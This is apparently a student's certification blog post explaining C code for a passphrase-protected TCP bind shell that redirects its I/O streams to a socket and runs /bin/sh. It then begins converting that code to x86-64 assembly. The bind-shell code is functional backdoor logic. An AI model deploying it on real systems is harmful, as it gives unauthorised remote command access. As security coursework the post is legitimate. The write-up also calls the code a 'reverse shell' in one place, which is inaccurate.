Blog Post #1

The first assignment in the SLAE64 final assessment is to create a piece of shellcode that will start a TCP Bind Shell. A bind shell listens on a network port and waits for an incoming connection. When a connection request is received, a new socket is spawned, the standard streams of the host are cloned into the new socket and a new shell instance is invoked. 

This has the effect of giving the remote user an interactive shell on the host system. Of course this is not as secure as something like an SSH connection, but is quite sufficient to let a remote user poke around the host system, issue commands and exfiltrate data.

As an extra twist, the assignment requires a little more security. A passphrase must be implemented in the bind shell. This prevents anyone who happens to stumble across the listening socket from simply dropping into the host system.

Of course, this 'security' is limited and anyone eavesdropping on the connection could sniff the passphrase with minimal effort, but it is an interesting exercise.

### High Level Proof of Concept

Vivek provided a rough outline of the code in C during the course and this was taken as a base for this assignment.

The full listing of my version of the code is hosted on GitHub: [Bind_Shell.c](https://github.com/CodeheadUK/SLAE64/blob/master/src/bind_shell.c).

The basic sections of code are:

# Variable Definitions and Initalisation

{{< highlight c >}}
	// Socket descriptors
	int svr_sock;
	int client_sock;

	// Socket definitions
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sockaddr_len = sizeof(struct sockaddr_in);

	// Some strings
	char *arguments[] = { "/bin/sh", 0 };
	char *in[] = { "xxxxxxxxxx", 0 };
	bzero(&in, 10);

	// Loop flag
	int connected = 0;
	
	// Populate the server port information
	server.sin_family = AF_INET;  // 2
	server.sin_port = htons(4444);
	server.sin_addr.s_addr = INADDR_ANY; // 0
	bzero(&server.sin_zero, 8);
{{</ highlight >}}

The first two variables are descriptors which will hold the identifiers for the sockets we'll create later.

The <tt>sockaddr_in</tt> structures are used to hold the configuration of the sockets. We populate the <tt>server</tt> configuration manually, but the <tt>client</tt> structure will be populated for us when we accept an incoming connection.

Lastly, we define a couple of string buffers that we'll need later and a flag to control teh authentication loop. The buffer definitions are a bit odd, but we don't want to worry about memory allocation here and will handle these strings differently in the assembly language anyway.

The next chunk of code sets up our server socket, binds it to a port using the <tt>sockaddr_in</tt> configuration and finally starts listening on the port.

{{< highlight c >}}
// Create the server socket
if((svr_sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1) // SOCK_STREAM = 1
{
	perror("Server socket: ");
	exit(-1);
}

// Bind the port
if((bind(svr_sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
{
	perror("Bind: ");
	exit(-1);
}

// Start listening for incoming connections
if((listen(svr_sock, 2)) == -1)
{
	perror("Listen: ");
	exit(-1);
}
{{</ highlight >}}

Now we have a listening socket, we can accept incoming connections. The passphrase validation is a loop that accepts incoming connections, prompts for and checks the passphrase. 

{{< highlight c >}}
// Start of authentication loop
do
{
	// Accept a request and spawn a new socket for the connection
	if((client_sock = accept(svr_sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
	{
		perror("Accept: ");
		exit(-1);	
	}
{{</ highlight >}}

This code accepts the connection and retains the newly spawned socket that the remote user is connected to.

We can send a message down the new socket to request the secret passphrase from the connecting user.

{{< highlight c >}}
	// Request a passphrase
	send(client_sock, (char*)"Speak Friend and Enter: ", 24, 0);
	read(client_sock, &in, 10);

	// Validate the passphrase
	if(strcmp(&in, "password\n") != 0)
	{
		// Reject bad passphrase and reset for next connection
		send(client_sock, (char*)"Goodbye\n", 8, 0);
		close(client_sock);
		printf("Auth fail: %s\n", (char*)in);
		bzero(&in, 10);
	}
{{</ highlight >}}

A bad passphrase results in the new socket being closed and the system going back to listening. Input data is limited by the length value in the read call. However, we have to zero out the input buffer after a failed attempt as there many be leftovers on the next pass.

If we get a good passphrase, we can break out of the authenticaton loop.

{{< highlight c >}}
	else
	{	
		// Break out of the loop when passphrase is good 
		send(client_sock, (char*)"Welcome\n", 8, 0);
		connected = 1;
		printf("Auth Passed!\n");
	}
}while(connected == 0);
{{</ highlight >}}

We can now kill the old server socket, clone the I/O streams into the new socket and spawn the shell.

{{< highlight c >}}
// Kill the server socket
close(svr_sock);

// Redirect file descriptors to new socket
dup2(client_sock, 0); // STDIN
dup2(client_sock, 1); // STDOUT
dup2(client_sock, 2); // STDERR

// Start a shell
execve(arguments[0], &arguments[0], NULL);
{{</ highlight >}}

That completes the functionality of the reverse shell in C. Now we need to convert it to Assembler.

### Translating The Code to Assembler

There are quite a few variables and structures to deal with in this code. Far more than can be managed by using registers for storage. 

We'll use the stack to hold some local variables. Rather than having single use variables, we'll reuse the addresses to keep things small and simple.

The sockaddr_in structure is described in netinet/in.h

{{< highlight c >}}
struct sockaddr_in {
    short            sin_family;   // 2 Bytes. e.g. AF_INET (2)
    unsigned short   sin_port;     // 2 Bytes. Network order.
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // Zero padding. 8 bytes.
};

struct in_addr {
    unsigned long s_addr;  // 4 bytes.
};
{{</ highlight >}}

This is 16 bytes that we'll place on the stack first

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html

Student ID: SLAE64-XXXXX
